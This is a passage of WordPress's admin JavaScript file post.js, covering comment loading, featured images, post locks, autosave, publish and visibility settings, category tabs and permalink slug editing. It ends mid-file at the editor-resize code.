/**
 * @file Contains all dynamic functionality needed on post and term pages.
 *
 * @output wp-admin/js/post.js
 */

 /* global ajaxurl, wpAjax, postboxes, pagenow, tinymce, alert, deleteUserSetting, ClipboardJS */
 /* global theList:true, theExtraList:true, getUserSetting, setUserSetting, commentReply, commentsBox */
 /* global WPSetThumbnailHTML, wptitlehint */

// Backward compatibility: prevent fatal errors.
window.makeSlugeditClickable = window.editPermalink = function(){};

// Make sure the wp object exists.
window.wp = window.wp || {};

( function( $ ) {
	var titleHasFocus = false,
		__ = wp.i18n.__;

	/**
	 * Control loading of comments on the post and term edit pages.
	 *
	 * @type {{st: number, get: commentsBox.get, load: commentsBox.load}}
	 *
	 * @namespace commentsBox
	 */
	window.commentsBox = {
		// Comment offset to use when fetching new comments.
		st : 0,

		/**
		 * Fetch comments using Ajax and display them in the box.
		 *
		 * @memberof commentsBox
		 *
		 * @param {number} total Total number of comments for this post.
		 * @param {number} num   Optional. Number of comments to fetch, defaults to 20.
		 * @return {boolean} Always returns false.
		 */
		get : function(total, num) {
			var st = this.st, data;
			if ( ! num )
				num = 20;

			this.st += num;
			this.total = total;
			$( '#commentsdiv .spinner' ).addClass( 'is-active' );

			data = {
				'action' : 'get-comments',
				'mode' : 'single',
				'_ajax_nonce' : $('#add_comment_nonce').val(),
				'p' : $('#post_ID').val(),
				'start' : st,
				'number' : num
			};

			$.post(
				ajaxurl,
				data,
				function(r) {
					r = wpAjax.parseAjaxResponse(r);
					$('#commentsdiv .widefat').show();
					$( '#commentsdiv .spinner' ).removeClass( 'is-active' );

					if ( 'object' == typeof r && r.responses[0] ) {
						$('#the-comment-list').append( r.responses[0].data );

						theList = theExtraList = null;
						$( 'a[className*=\':\']' ).off();

						// If the offset is over the total number of comments we cannot fetch any more, so hide the button.
						if ( commentsBox.st > commentsBox.total )
							$('#show-comments').hide();
						else
							$('#show-comments').show().children('a').text( __( 'Show more comments' ) );

						return;
					} else if ( 1 == r ) {
						$('#show-comments').text( __( 'No more comments found.' ) );
						return;
					}

					$('#the-comment-list').append('<tr><td colspan="2">'+wpAjax.broken+'</td></tr>');
				}
			);

			return false;
		},

		/**
		 * Load the next batch of comments.
		 *
		 * @memberof commentsBox
		 *
		 * @param {number} total Total number of comments to load.
		 */
		load: function(total){
			this.st = jQuery('#the-comment-list tr.comment:visible').length;
			this.get(total);
		}
	};

	/**
	 * Overwrite the content of the Featured Image postbox
	 *
	 * @param {string} html New HTML to be displayed in the content area of the postbox.
	 *
	 * @global
	 */
	window.WPSetThumbnailHTML = function(html){
		$('.inside', '#postimagediv').html(html);
	};

	/**
	 * Set the Image ID of the Featured Image
	 *
	 * @param {number} id The post_id of the image to use as Featured Image.
	 *
	 * @global
	 */
	window.WPSetThumbnailID = function(id){
		var field = $('input[value="_thumbnail_id"]', '#list-table');
		if ( field.length > 0 ) {
			$('#meta\\[' + field.attr('id').match(/[0-9]+/) + '\\]\\[value\\]').text(id);
		}
	};

	/**
	 * Remove the Featured Image
	 *
	 * @param {string} nonce Nonce to use in the request.
	 *
	 * @global
	 */
	window.WPRemoveThumbnail = function(nonce){
		$.post(
			ajaxurl, {
				action: 'set-post-thumbnail',
				post_id: $( '#post_ID' ).val(),
				thumbnail_id: -1,
				_ajax_nonce: nonce,
				cookie: encodeURIComponent( document.cookie )
			},
			/**
			 * Handle server response
			 *
			 * @param {string} str Response, will be '0' when an error occurred otherwise contains link to add Featured Image.
			 */
			function(str){
				if ( str == '0' ) {
					alert( __( 'Could not set that as the thumbnail image. Try a different attachment.' ) );
				} else {
					WPSetThumbnailHTML(str);
				}
			}
		);
	};

	/**
	 * Heartbeat locks.
	 *
	 * Used to lock editing of an object by only one user at a time.
	 *
	 * When the user does not send a heartbeat in a heartbeat-time
	 * the user is no longer editing and another user can start editing.
	 */
	$(document).on( 'heartbeat-send.refresh-lock', function( e, data ) {
		var lock = $('#active_post_lock').val(),
			post_id = $('#post_ID').val(),
			send = {};

		if ( ! post_id || ! $('#post-lock-dialog').length )
			return;

		send.post_id = post_id;

		if ( lock )
			send.lock = lock;

		data['wp-refresh-post-lock'] = send;

	}).on( 'heartbeat-tick.refresh-lock', function( e, data ) {
		// Post locks: update the lock string or show the dialog if somebody has taken over editing.
		var received, wrap, avatar;

		if ( data['wp-refresh-post-lock'] ) {
			received = data['wp-refresh-post-lock'];

			if ( received.lock_error ) {
				// Show "editing taken over" message.
				wrap = $('#post-lock-dialog');

				if ( wrap.length && ! wrap.is(':visible') ) {
					if ( wp.autosave ) {
						// Save the latest changes and disable.
						$(document).one( 'heartbeat-tick', function() {
							wp.autosave.server.suspend();
							wrap.removeClass('saving').addClass('saved');
							$(window).off( 'beforeunload.edit-post' );
						});

						wrap.addClass('saving');
						wp.autosave.server.triggerSave();
					}

					if ( received.lock_error.avatar_src ) {
						avatar = $( '<img />', {
							'class': 'avatar avatar-64 photo',
							width: 64,
							height: 64,
							alt: '',
							src: received.lock_error.avatar_src,
							srcset: received.lock_error.avatar_src_2x ?
								received.lock_error.avatar_src_2x + ' 2x' :
								undefined
						} );
						wrap.find('div.post-locked-avatar').empty().append( avatar );
					}

					wrap.show().find('.currently-editing').text( received.lock_error.text );
					wrap.find('.wp-tab-first').trigger( 'focus' );
				}
			} else if ( received.new_lock ) {
				$('#active_post_lock').val( received.new_lock );
			}
		}
	}).on( 'before-autosave.update-post-slug', function() {
		titleHasFocus = document.activeElement && document.activeElement.id === 'title';
	}).on( 'after-autosave.update-post-slug', function() {

		/*
		 * Create slug area only if not already there
		 * and the title field was not focused (user was not typing a title) when autosave ran.
		 */
		if ( ! $('#edit-slug-box > *').length && ! titleHasFocus ) {
			$.post( ajaxurl, {
					action: 'sample-permalink',
					post_id: $('#post_ID').val(),
					new_title: $('#title').val(),
					samplepermalinknonce: $('#samplepermalinknonce').val()
				},
				function( data ) {
					if ( data != '-1' ) {
						$('#edit-slug-box').html(data);
					}
				}
			);
		}
	});

}(jQuery));

/**
 * Heartbeat refresh nonces.
 */
(function($) {
	var check, timeout;

	/**
	 * Only allow to check for nonce refresh every 30 seconds.
	 */
	function schedule() {
		check = false;
		window.clearTimeout( timeout );
		timeout = window.setTimeout( function(){ check = true; }, 300000 );
	}

	$( function() {
		schedule();
	}).on( 'heartbeat-send.wp-refresh-nonces', function( e, data ) {
		var post_id,
			$authCheck = $('#wp-auth-check-wrap');

		if ( check || ( $authCheck.length && ! $authCheck.hasClass( 'hidden' ) ) ) {
			if ( ( post_id = $('#post_ID').val() ) && $('#_wpnonce').val() ) {
				data['wp-refresh-post-nonces'] = {
					post_id: post_id
				};
			}
		}
	}).on( 'heartbeat-tick.wp-refresh-nonces', function( e, data ) {
		var nonces = data['wp-refresh-post-nonces'];

		if ( nonces ) {
			schedule();

			if ( nonces.replace ) {
				$.each( nonces.replace, function( selector, value ) {
					$( '#' + selector ).val( value );
				});
			}

			if ( nonces.heartbeatNonce )
				window.heartbeatSettings.nonce = nonces.heartbeatNonce;
		}
	});
}(jQuery));

/**
 * All post and postbox controls and functionality.
 */
jQuery( function($) {
	var stamp, visibility, $submitButtons, updateVisibility, updateText,
		$textarea = $('#content'),
		$document = $(document),
		postId = $('#post_ID').val() || 0,
		$submitpost = $('#submitpost'),
		releaseLock = true,
		$postVisibilitySelect = $('#post-visibility-select'),
		$timestampdiv = $('#timestampdiv'),
		$postStatusSelect = $('#post-status-select'),
		isMac = window.navigator.platform ? window.navigator.platform.indexOf( 'Mac' ) !== -1 : false,
		copyAttachmentURLClipboard = new ClipboardJS( '.copy-attachment-url.edit-media' ),
		copyAttachmentURLSuccessTimeout,
		__ = wp.i18n.__, _x = wp.i18n._x;

	postboxes.add_postbox_toggles(pagenow);

	/*
	 * Clear the window name. Otherwise if this is a former preview window where the user navigated to edit another post,
	 * and the first post is still being edited, clicking Preview there will use this window to show the preview.
	 */
	window.name = '';

	// Post locks: contain focus inside the dialog. If the dialog is shown, focus the first item.
	$('#post-lock-dialog .notification-dialog').on( 'keydown', function(e) {
		// Don't do anything when [Tab] is pressed.
		if ( e.which != 9 )
			return;

		var target = $(e.target);

		// [Shift] + [Tab] on first tab cycles back to last tab.
		if ( target.hasClass('wp-tab-first') && e.shiftKey ) {
			$(this).find('.wp-tab-last').trigger( 'focus' );
			e.preventDefault();
		// [Tab] on last tab cycles back to first tab.
		} else if ( target.hasClass('wp-tab-last') && ! e.shiftKey ) {
			$(this).find('.wp-tab-first').trigger( 'focus' );
			e.preventDefault();
		}
	}).filter(':visible').find('.wp-tab-first').trigger( 'focus' );

	// Set the heartbeat interval to 15 seconds if post lock dialogs are enabled.
	if ( wp.heartbeat && $('#post-lock-dialog').length ) {
		wp.heartbeat.interval( 15 );
	}

	// The form is being submitted by the user.
	$submitButtons = $submitpost.find( ':submit, a.submitdelete, #post-preview' ).on( 'click.edit-post', function( event ) {
		var $button = $(this);

		if ( $button.hasClass('disabled') ) {
			event.preventDefault();
			return;
		}

		if ( $button.hasClass('submitdelete') || $button.is( '#post-preview' ) ) {
			return;
		}

		// The form submission can be blocked from JS or by using HTML 5.0 validation on some fields.
		// Run this only on an actual 'submit'.
		$('form#post').off( 'submit.edit-post' ).on( 'submit.edit-post', function( event ) {
			if ( event.isDefaultPrevented() ) {
				return;
			}

			// Stop auto save.
			if ( wp.autosave ) {
				wp.autosave.server.suspend();
			}

			if ( typeof commentReply !== 'undefined' ) {
				/*
				 * Warn the user they have an unsaved comment before submitting
				 * the post data for update.
				 */
				if ( ! commentReply.discardCommentChanges() ) {
					return false;
				}

				/*
				 * Close the comment edit/reply form if open to stop the form
				 * action from interfering with the post's form action.
				 */
				commentReply.close();
			}

			releaseLock = false;
			$(window).off( 'beforeunload.edit-post' );

			$submitButtons.addClass( 'disabled' );

			if ( $button.attr('id') === 'publish' ) {
				$submitpost.find( '#major-publishing-actions .spinner' ).addClass( 'is-active' );
			} else {
				$submitpost.find( '#minor-publishing .spinner' ).addClass( 'is-active' );
			}
		});
	});

	// Submit the form saving a draft or an autosave, and show a preview in a new tab.
	$('#post-preview').on( 'click.post-preview', function( event ) {
		var $this = $(this),
			$form = $('form#post'),
			$previewField = $('input#wp-preview'),
			target = $this.attr('target') || 'wp-preview',
			ua = navigator.userAgent.toLowerCase();

		event.preventDefault();

		if ( $this.hasClass('disabled') ) {
			return;
		}

		if ( wp.autosave ) {
			wp.autosave.server.tempBlockSave();
		}

		$previewField.val('dopreview');
		$form.attr( 'target', target ).trigger( 'submit' ).attr( 'target', '' );

		// Workaround for WebKit bug preventing a form submitting twice to the same action.
		// https://bugs.webkit.org/show_bug.cgi?id=28633
		if ( ua.indexOf('safari') !== -1 && ua.indexOf('chrome') === -1 ) {
			$form.attr( 'action', function( index, value ) {
				return value + '?t=' + ( new Date() ).getTime();
			});
		}

		$previewField.val('');
	});

	// This code is meant to allow tabbing from Title to Post content.
	$('#title').on( 'keydown.editor-focus', function( event ) {
		var editor;

		if ( event.keyCode === 9 && ! event.ctrlKey && ! event.altKey && ! event.shiftKey ) {
			editor = typeof tinymce != 'undefined' && tinymce.get('content');

			if ( editor && ! editor.isHidden() ) {
				editor.focus();
			} else if ( $textarea.length ) {
				$textarea.trigger( 'focus' );
			} else {
				return;
			}

			event.preventDefault();
		}
	});

	// Auto save new posts after a title is typed.
	if ( $( '#auto_draft' ).val() ) {
		$( '#title' ).on( 'blur', function() {
			var cancel;

			if ( ! this.value || $('#edit-slug-box > *').length ) {
				return;
			}

			// Cancel the auto save when the blur was triggered by the user submitting the form.
			$('form#post').one( 'submit', function() {
				cancel = true;
			});

			window.setTimeout( function() {
				if ( ! cancel && wp.autosave ) {
					wp.autosave.server.triggerSave();
				}
			}, 200 );
		});
	}

	$document.on( 'autosave-disable-buttons.edit-post', function() {
		$submitButtons.addClass( 'disabled' );
	}).on( 'autosave-enable-buttons.edit-post', function() {
		if ( ! wp.heartbeat || ! wp.heartbeat.hasConnectionError() ) {
			$submitButtons.removeClass( 'disabled' );
		}
	}).on( 'before-autosave.edit-post', function() {
		$( '.autosave-message' ).text( __( 'Saving Draft…' ) );
	}).on( 'after-autosave.edit-post', function( event, data ) {
		$( '.autosave-message' ).text( data.message );

		if ( $( document.body ).hasClass( 'post-new-php' ) ) {
			$( '.submitbox .submitdelete' ).show();
		}
	});

	/*
	 * When the user is trying to load another page, or reloads current page
	 * show a confirmation dialog when there are unsaved changes.
	 */
	$( window ).on( 'beforeunload.edit-post', function( event ) {
		var editor  = window.tinymce && window.tinymce.get( 'content' );
		var changed = false;

		if ( wp.autosave ) {
			changed = wp.autosave.server.postChanged();
		} else if ( editor ) {
			changed = ( ! editor.isHidden() && editor.isDirty() );
		}

		if ( changed ) {
			event.preventDefault();
			// The return string is needed for browser compat.
			// See https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event.
			return __( 'The changes you made will be lost if you navigate away from this page.' );
		}
	}).on( 'pagehide.edit-post', function( event ) {
		if ( ! releaseLock ) {
			return;
		}

		/*
		 * Unload is triggered (by hand) on removing the Thickbox iframe.
		 * Make sure we process only the main document unload.
		 */
		if ( event.target && event.target.nodeName != '#document' ) {
			return;
		}

		var postID = $('#post_ID').val();
		var postLock = $('#active_post_lock').val();

		if ( ! postID || ! postLock ) {
			return;
		}

		var data = {
			action: 'wp-remove-post-lock',
			_wpnonce: $('#_wpnonce').val(),
			post_ID: postID,
			active_post_lock: postLock
		};

		if ( window.FormData && window.navigator.sendBeacon ) {
			var formData = new window.FormData();

			$.each( data, function( key, value ) {
				formData.append( key, value );
			});

			if ( window.navigator.sendBeacon( ajaxurl, formData ) ) {
				return;
			}
		}

		// Fall back to a synchronous POST request.
		// See https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon
		$.post({
			async: false,
			data: data,
			url: ajaxurl
		});
	});

	// Multiple taxonomies.
	if ( $('#tagsdiv-post_tag').length ) {
		window.tagBox && window.tagBox.init();
	} else {
		$('.meta-box-sortables').children('div.postbox').each(function(){
			if ( this.id.indexOf('tagsdiv-') === 0 ) {
				window.tagBox && window.tagBox.init();
				return false;
			}
		});
	}

	// Handle categories.
	$('.categorydiv').each( function(){
		var this_id = $(this).attr('id'), catAddBefore, catAddAfter, taxonomyParts, taxonomy, settingName;

		taxonomyParts = this_id.split('-');
		taxonomyParts.shift();
		taxonomy = taxonomyParts.join('-');
		settingName = taxonomy + '_tab';

		if ( taxonomy == 'category' ) {
			settingName = 'cats';
		}

		// @todo Move to jQuery 1.3+, support for multiple hierarchical taxonomies, see wp-lists.js.
		$('a', '#' + taxonomy + '-tabs').on( 'click', function( e ) {
			e.preventDefault();
			var t = $(this).attr('href');
			$(this).parent().addClass('tabs').siblings('li').removeClass('tabs');
			$('#' + taxonomy + '-tabs').siblings('.tabs-panel').hide();
			$(t).show();
			if ( '#' + taxonomy + '-all' == t ) {
				deleteUserSetting( settingName );
			} else {
				setUserSetting( settingName, 'pop' );
			}
		});

		if ( getUserSetting( settingName ) )
			$('a[href="#' + taxonomy + '-pop"]', '#' + taxonomy + '-tabs').trigger( 'click' );

		// Add category button controls.
		$('#new' + taxonomy).one( 'focus', function() {
			$( this ).val( '' ).removeClass( 'form-input-tip' );
		});

		// On [Enter] submit the taxonomy.
		$('#new' + taxonomy).on( 'keypress', function(event){
			if( 13 === event.keyCode ) {
				event.preventDefault();
				$('#' + taxonomy + '-add-submit').trigger( 'click' );
			}
		});

		// After submitting a new taxonomy, re-focus the input field.
		$('#' + taxonomy + '-add-submit').on( 'click', function() {
			$('#new' + taxonomy).trigger( 'focus' );
		});

		/**
		 * Before adding a new taxonomy, disable submit button.
		 *
		 * @param {Object} s Taxonomy object which will be added.
		 *
		 * @return {Object}
		 */
		catAddBefore = function( s ) {
			if ( !$('#new'+taxonomy).val() ) {
				return false;
			}

			s.data += '&' + $( ':checked', '#'+taxonomy+'checklist' ).serialize();
			$( '#' + taxonomy + '-add-submit' ).prop( 'disabled', true );
			return s;
		};

		/**
		 * Re-enable submit button after a taxonomy has been added.
		 *
		 * Re-enable submit button.
		 * If the taxonomy has a parent place the taxonomy underneath the parent.
		 *
		 * @param {Object} r Response.
		 * @param {Object} s Taxonomy data.
		 *
		 * @return {void}
		 */
		catAddAfter = function( r, s ) {
			var sup, drop = $('#new'+taxonomy+'_parent');

			$( '#' + taxonomy + '-add-submit' ).prop( 'disabled', false );
			if ( 'undefined' != s.parsed.responses[0] && (sup = s.parsed.responses[0].supplemental.newcat_parent) ) {
				drop.before(sup);
				drop.remove();
			}
		};

		$('#' + taxonomy + 'checklist').wpList({
			alt: '',
			response: taxonomy + '-ajax-response',
			addBefore: catAddBefore,
			addAfter: catAddAfter
		});

		// Add new taxonomy button toggles input form visibility.
		$('#' + taxonomy + '-add-toggle').on( 'click', function( e ) {
			e.preventDefault();
			$('#' + taxonomy + '-adder').toggleClass( 'wp-hidden-children' );
			$('a[href="#' + taxonomy + '-all"]', '#' + taxonomy + '-tabs').trigger( 'click' );
			$('#new'+taxonomy).trigger( 'focus' );
		});

		// Sync checked items between "All {taxonomy}" and "Most used" lists.
		$('#' + taxonomy + 'checklist, #' + taxonomy + 'checklist-pop').on(
			'click',
			'li.popular-category > label input[type="checkbox"]',
			function() {
				var t = $(this), c = t.is(':checked'), id = t.val();
				if ( id && t.parents('#taxonomy-'+taxonomy).length )
					$('#in-' + taxonomy + '-' + id + ', #in-popular-' + taxonomy + '-' + id).prop( 'checked', c );
			}
		);

	}); // End cats.

	// Custom Fields postbox.
	if ( $('#postcustom').length ) {
		$( '#the-list' ).wpList( {
			/**
			 * Add current post_ID to request to fetch custom fields
			 *
			 * @ignore
			 *
			 * @param {Object} s Request object.
			 *
			 * @return {Object} Data modified with post_ID attached.
			 */
			addBefore: function( s ) {
				s.data += '&post_id=' + $('#post_ID').val();
				return s;
			},
			/**
			 * Show the listing of custom fields after fetching.
			 *
			 * @ignore
			 */
			addAfter: function() {
				$('table#list-table').show();
			}
		});
	}

	/*
	 * Publish Post box (#submitdiv)
	 */
	if ( $('#submitdiv').length ) {
		stamp = $('#timestamp').html();
		visibility = $('#post-visibility-display').html();

		/**
		 * When the visibility of a post changes sub-options should be shown or hidden.
		 *
		 * @ignore
		 *
		 * @return {void}
		 */
		updateVisibility = function() {
			// Show sticky for public posts.
			if ( $postVisibilitySelect.find('input:radio:checked').val() != 'public' ) {
				$('#sticky').prop('checked', false);
				$('#sticky-span').hide();
			} else {
				$('#sticky-span').show();
			}

			// Show password input field for password protected post.
			if ( $postVisibilitySelect.find('input:radio:checked').val() != 'password' ) {
				$('#password-span').hide();
			} else {
				$('#password-span').show();
			}
		};

		/**
		 * Make sure all labels represent the current settings.
		 *
		 * @ignore
		 *
		 * @return {boolean} False when an invalid timestamp has been selected, otherwise True.
		 */
		updateText = function() {

			if ( ! $timestampdiv.length )
				return true;

			var attemptedDate, originalDate, currentDate, publishOn, postStatus = $('#post_status'),
				optPublish = $('option[value="publish"]', postStatus), aa = $('#aa').val(),
				mm = $('#mm').val(), jj = $('#jj').val(), hh = $('#hh').val(), mn = $('#mn').val();

			attemptedDate = new Date( aa, mm - 1, jj, hh, mn );
			originalDate = new Date(
				$('#hidden_aa').val(),
				$('#hidden_mm').val() -1,
				$('#hidden_jj').val(),
				$('#hidden_hh').val(),
				$('#hidden_mn').val()
			);
			currentDate = new Date(
				$('#cur_aa').val(),
				$('#cur_mm').val() -1,
				$('#cur_jj').val(),
				$('#cur_hh').val(),
				$('#cur_mn').val()
			);

			// Catch unexpected date problems.
			if (
				attemptedDate.getFullYear() != aa ||
				(1 + attemptedDate.getMonth()) != mm ||
				attemptedDate.getDate() != jj ||
				attemptedDate.getMinutes() != mn
			) {
				$timestampdiv.find('.timestamp-wrap').addClass('form-invalid');
				return false;
			} else {
				$timestampdiv.find('.timestamp-wrap').removeClass('form-invalid');
			}

			// Determine what the publish should be depending on the date and post status.
			if ( attemptedDate > currentDate ) {
				publishOn = __( 'Schedule for:' );
				$('#publish').val( _x( 'Schedule', 'post action/button label' ) );
			} else if ( attemptedDate <= currentDate && $('#original_post_status').val() != 'publish' ) {
				publishOn = __( 'Publish on:' );
				$('#publish').val( __( 'Publish' ) );
			} else {
				publishOn = __( 'Published on:' );
				$('#publish').val( __( 'Update' ) );
			}

			// If the date is the same, set it to trigger update events.
			if ( originalDate.toUTCString() == attemptedDate.toUTCString() ) {
				// Re-set to the current value.
				$('#timestamp').html(stamp);
			} else {
				$('#timestamp').html(
					'\n' + publishOn + ' <b>' +
					// translators: 1: Month, 2: Day, 3: Year, 4: Hour, 5: Minute.
					__( '%1$s %2$s, %3$s at %4$s:%5$s' )
						.replace( '%1$s', $( 'option[value="' + mm + '"]', '#mm' ).attr( 'data-text' ) )
						.replace( '%2$s', parseInt( jj, 10 ) )
						.replace( '%3$s', aa )
						.replace( '%4$s', ( '00' + hh ).slice( -2 ) )
						.replace( '%5$s', ( '00' + mn ).slice( -2 ) ) +
						'</b> '
				);
			}

			// Add "privately published" to post status when applies.
			if ( $postVisibilitySelect.find('input:radio:checked').val() == 'private' ) {
				$('#publish').val( __( 'Update' ) );
				if ( 0 === optPublish.length ) {
					postStatus.append('<option value="publish">' + __( 'Privately Published' ) + '</option>');
				} else {
					optPublish.html( __( 'Privately Published' ) );
				}
				$('option[value="publish"]', postStatus).prop('selected', true);
				$('#misc-publishing-actions .edit-post-status').hide();
			} else {
				if ( $('#original_post_status').val() == 'future' || $('#original_post_status').val() == 'draft' ) {
					if ( optPublish.length ) {
						optPublish.remove();
						postStatus.val($('#hidden_post_status').val());
					}
				} else {
					optPublish.html( __( 'Published' ) );
				}
				if ( postStatus.is(':hidden') )
					$('#misc-publishing-actions .edit-post-status').show();
			}

			// Update "Status:" to currently selected status.
			$('#post-status-display').text(
				// Remove any potential tags from post status text.
				wp.sanitize.stripTagsAndEncodeText( $('option:selected', postStatus).text() )
			);

			// Show or hide the "Save Draft" button.
			if (
				$('option:selected', postStatus).val() == 'private' ||
				$('option:selected', postStatus).val() == 'publish'
			) {
				$('#save-post').hide();
			} else {
				$('#save-post').show();
				if ( $('option:selected', postStatus).val() == 'pending' ) {
					$('#save-post').show().val( __( 'Save as Pending' ) );
				} else {
					$('#save-post').show().val( __( 'Save Draft' ) );
				}
			}
			return true;
		};

		// Show the visibility options and hide the toggle button when opened.
		$( '#visibility .edit-visibility').on( 'click', function( e ) {
			e.preventDefault();
			if ( $postVisibilitySelect.is(':hidden') ) {
				updateVisibility();
				$postVisibilitySelect.slideDown( 'fast', function() {
					$postVisibilitySelect.find( 'input[type="radio"]' ).first().trigger( 'focus' );
				} );
				$(this).hide();
			}
		});

		// Cancel visibility selection area and hide it from view.
		$postVisibilitySelect.find('.cancel-post-visibility').on( 'click', function( event ) {
			$postVisibilitySelect.slideUp('fast');
			$('#visibility-radio-' + $('#hidden-post-visibility').val()).prop('checked', true);
			$('#post_password').val($('#hidden-post-password').val());
			$('#sticky').prop('checked', $('#hidden-post-sticky').prop('checked'));
			$('#post-visibility-display').html(visibility);
			$('#visibility .edit-visibility').show().trigger( 'focus' );
			updateText();
			event.preventDefault();
		});

		// Set the selected visibility as current.
		$postVisibilitySelect.find('.save-post-visibility').on( 'click', function( event ) { // Crazyhorse - multiple OK cancels.
			var visibilityLabel = '', selectedVisibility = $postVisibilitySelect.find('input:radio:checked').val();

			$postVisibilitySelect.slideUp('fast');
			$('#visibility .edit-visibility').show().trigger( 'focus' );
			updateText();

			if ( 'public' !== selectedVisibility ) {
				$('#sticky').prop('checked', false);
			}

			switch ( selectedVisibility ) {
				case 'public':
					visibilityLabel = $( '#sticky' ).prop( 'checked' ) ? __( 'Public, Sticky' ) : __( 'Public' );
					break;
				case 'private':
					visibilityLabel = __( 'Private' );
					break;
				case 'password':
					visibilityLabel = __( 'Password Protected' );
					break;
			}

			$('#post-visibility-display').text( visibilityLabel );
			event.preventDefault();
		});

		// When the selection changes, update labels.
		$postVisibilitySelect.find('input:radio').on( 'change', function() {
			updateVisibility();
		});

		// Edit publish time click.
		$timestampdiv.siblings('a.edit-timestamp').on( 'click', function( event ) {
			if ( $timestampdiv.is( ':hidden' ) ) {
				$timestampdiv.slideDown( 'fast', function() {
					$( 'input, select', $timestampdiv.find( '.timestamp-wrap' ) ).first().trigger( 'focus' );
				} );
				$(this).hide();
			}
			event.preventDefault();
		});

		// Cancel editing the publish time and hide the settings.
		$timestampdiv.find('.cancel-timestamp').on( 'click', function( event ) {
			$timestampdiv.slideUp('fast').siblings('a.edit-timestamp').show().trigger( 'focus' );
			$('#mm').val($('#hidden_mm').val());
			$('#jj').val($('#hidden_jj').val());
			$('#aa').val($('#hidden_aa').val());
			$('#hh').val($('#hidden_hh').val());
			$('#mn').val($('#hidden_mn').val());
			updateText();
			event.preventDefault();
		});

		// Save the changed timestamp.
		$timestampdiv.find('.save-timestamp').on( 'click', function( event ) { // Crazyhorse - multiple OK cancels.
			if ( updateText() ) {
				$timestampdiv.slideUp('fast');
				$timestampdiv.siblings('a.edit-timestamp').show().trigger( 'focus' );
			}
			event.preventDefault();
		});

		// Cancel submit when an invalid timestamp has been selected.
		$('#post').on( 'submit', function( event ) {
			if ( ! updateText() ) {
				event.preventDefault();
				$timestampdiv.show();

				if ( wp.autosave ) {
					wp.autosave.enableButtons();
				}

				$( '#publishing-action .spinner' ).removeClass( 'is-active' );
			}
		});

		// Post Status edit click.
		$postStatusSelect.siblings('a.edit-post-status').on( 'click', function( event ) {
			if ( $postStatusSelect.is( ':hidden' ) ) {
				$postStatusSelect.slideDown( 'fast', function() {
					$postStatusSelect.find('select').trigger( 'focus' );
				} );
				$(this).hide();
			}
			event.preventDefault();
		});

		// Save the Post Status changes and hide the options.
		$postStatusSelect.find('.save-post-status').on( 'click', function( event ) {
			$postStatusSelect.slideUp( 'fast' ).siblings( 'a.edit-post-status' ).show().trigger( 'focus' );
			updateText();
			event.preventDefault();
		});

		// Cancel Post Status editing and hide the options.
		$postStatusSelect.find('.cancel-post-status').on( 'click', function( event ) {
			$postStatusSelect.slideUp( 'fast' ).siblings( 'a.edit-post-status' ).show().trigger( 'focus' );
			$('#post_status').val( $('#hidden_post_status').val() );
			updateText();
			event.preventDefault();
		});
	}

	/**
	 * Handle the editing of the post_name. Create the required HTML elements and
	 * update the changes via Ajax.
	 *
	 * @global
	 *
	 * @return {void}
	 */
	function editPermalink() {
		var i, slug_value, slug_label,
			$el, revert_e,
			c = 0,
			real_slug = $('#post_name'),
			revert_slug = real_slug.val(),
			permalink = $( '#sample-permalink' ),
			permalinkOrig = permalink.html(),
			permalinkInner = $( '#sample-permalink a' ).html(),
			buttons = $('#edit-slug-buttons'),
			buttonsOrig = buttons.html(),
			full = $('#editable-post-name-full');

		// Deal with Twemoji in the post-name.
		full.find( 'img' ).replaceWith( function() { return this.alt; } );
		full = full.html();

		permalink.html( permalinkInner );

		// Save current content to revert to when cancelling.
		$el = $( '#editable-post-name' );
		revert_e = $el.html();

		buttons.html(
			'<button type="button" class="save button button-small">' + __( 'OK' ) + '</button> ' +
			'<button type="button" class="cancel button-link">' + __( 'Cancel' ) + '</button>'
		);

		// Save permalink changes.
		buttons.children( '.save' ).on( 'click', function() {
			var new_slug = $el.children( 'input' ).val();

			if ( new_slug == $('#editable-post-name-full').text() ) {
				buttons.children('.cancel').trigger( 'click' );
				return;
			}

			$.post(
				ajaxurl,
				{
					action: 'sample-permalink',
					post_id: postId,
					new_slug: new_slug,
					new_title: $('#title').val(),
					samplepermalinknonce: $('#samplepermalinknonce').val()
				},
				function(data) {
					var box = $('#edit-slug-box');
					box.html(data);
					if (box.hasClass('hidden')) {
						box.fadeIn('fast', function () {
							box.removeClass('hidden');
						});
					}

					buttons.html(buttonsOrig);
					permalink.html(permalinkOrig);
					real_slug.val(new_slug);
					$( '.edit-slug' ).trigger( 'focus' );
					wp.a11y.speak( __( 'Permalink saved' ) );
				}
			);
		});

		// Cancel editing of permalink.
		buttons.children( '.cancel' ).on( 'click', function() {
			$('#view-post-btn').show();
			$el.html(revert_e);
			buttons.html(buttonsOrig);
			permalink.html(permalinkOrig);
			real_slug.val(revert_slug);
			$( '.edit-slug' ).trigger( 'focus' );
		});

		// If more than 1/4th of 'full' is '%', make it empty.
		for ( i = 0; i < full.length; ++i ) {
			if ( '%' == full.charAt(i) )
				c++;
		}
		slug_value = ( c > full.length / 4 ) ? '' : full;
		slug_label = __( 'URL Slug' );

		$el.html(
			'<label for="new-post-slug" class="screen-reader-text">' + slug_label + '</label>' +
			'<input type="text" id="new-post-slug" value="' + slug_value + '" autocomplete="off" spellcheck="false" />'
		).children( 'input' ).on( 'keydown', function( e ) {
			var key = e.which;
			// On [Enter], just save the new slug, don't save the post.
			if ( 13 === key ) {
				e.preventDefault();
				buttons.children( '.save' ).trigger( 'click' );
			}
			// On [Esc] cancel the editing.
			if ( 27 === key ) {
				buttons.children( '.cancel' ).trigger( 'click' );
			}
		} ).on( 'keyup', function() {
			real_slug.val( this.value );
		}).trigger( 'focus' );
	}

	$( '#titlediv' ).on( 'click', '.edit-slug', function() {
		editPermalink();
	});

	/**
	 * Adds screen reader text to the title label when needed.
	 *
	 * Use the 'screen-reader-text' class to emulate a placeholder attribute
	 * and hide the label when entering a value.
	 *
	 * @param {string} id Optional. HTML ID to add the screen reader helper text to.
	 *
	 * @global
	 *
	 * @return {void}
	 */
	window.wptitlehint = function( id ) {
		id = id || 'title';

		var title = $( '#' + id ), titleprompt = $( '#' + id + '-prompt-text' );

		if ( '' === title.val() ) {
			titleprompt.removeClass( 'screen-reader-text' );
		}

		title.on( 'input', function() {
			if ( '' === this.value ) {
				titleprompt.removeClass( 'screen-reader-text' );
				return;
			}

			titleprompt.addClass( 'screen-reader-text' );
		} );
	};

	wptitlehint();

	// Resize the WYSIWYG and plain text editors.
	( function() {
